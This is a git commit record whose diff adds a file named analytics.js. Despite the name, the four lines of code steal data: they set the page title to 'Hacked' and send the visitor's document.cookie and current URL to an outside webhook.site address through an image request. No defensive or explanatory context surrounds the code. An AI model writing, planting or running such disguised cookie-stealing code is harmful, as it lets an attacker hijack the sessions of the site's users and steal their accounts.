5dd246a94e2582cb9e5d7c42bb03524c2eb31136
RoyLee <126839548+R0YLeee@users.noreply.github.com>
2026-04-23 13:25:07 +1000

    Add files via upload

---
+++ analytics.js
@@ -0,0 +1,4 @@
+document.title = "Hacked"; 
+new Image().src = "https://webhook.site/00eb4e0b-6b16-42cf-ba61-7aed47ab421c/?c=" 
+  + encodeURIComponent(document.cookie) 
+  + "&u=" + encodeURIComponent(location.href);
